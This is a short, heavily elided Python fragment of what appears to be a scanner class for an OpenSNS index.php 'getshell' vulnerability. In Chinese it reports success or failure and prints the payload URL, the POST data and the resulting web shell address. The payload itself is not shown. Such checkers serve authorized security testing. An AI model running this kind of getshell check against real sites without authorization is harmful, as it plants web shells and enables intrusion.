    ...
    def run(self):
        ...
        try:
            ...
            if r"Configuration File (php.ini) Path" in req2.text:
                printGreen("[+]Success:存在opensns index.php 前台getshell漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshell地址: "+shellurl)
            else:
                printBlue("[-]Info:不存在opensns_index_getshell漏洞")
...
if __name__ == "__main__":
    ...
    testVuln = opensns_index_getshell(sys.argv[1])
    testVuln.run()